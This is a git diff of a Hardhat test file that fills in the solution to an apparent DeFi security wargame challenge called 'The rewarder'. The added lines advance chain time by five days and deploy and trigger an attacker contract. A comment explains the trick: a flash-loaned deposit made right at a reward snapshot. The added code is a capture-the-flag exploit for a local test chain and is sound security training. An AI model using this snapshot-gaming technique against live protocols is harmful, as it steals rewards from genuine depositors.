@@ -1,7 +1,7 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 
-describe('[Challenge] The rewarder', function () {
+describe.only('[Challenge] The rewarder', function () {
 
     let deployer, alice, bob, charlie, david, attacker;
     let users;
@@ -66,6 +66,18 @@ describe('[Challenge] The rewarder', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // The rewarder pool takes a snapshot every 5 days. If we manage to make the first
+        // deposit 5 days after the last snapshot, our flashloaned deposit will be
+        // saved on a snapshot and we will be eligible for rewards
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+        const AttackerFactory = await ethers.getContractFactory("TheRewarderAttacker");
+        this.attackerContract = await AttackerFactory.connect(attacker).deploy(
+            this.flashLoanPool.address,
+            this.liquidityToken.address,
+            this.rewardToken.address,
+            this.rewarderPool.address
+        );
+        await this.attackerContract.attack();
     });
 
     after(async function () {
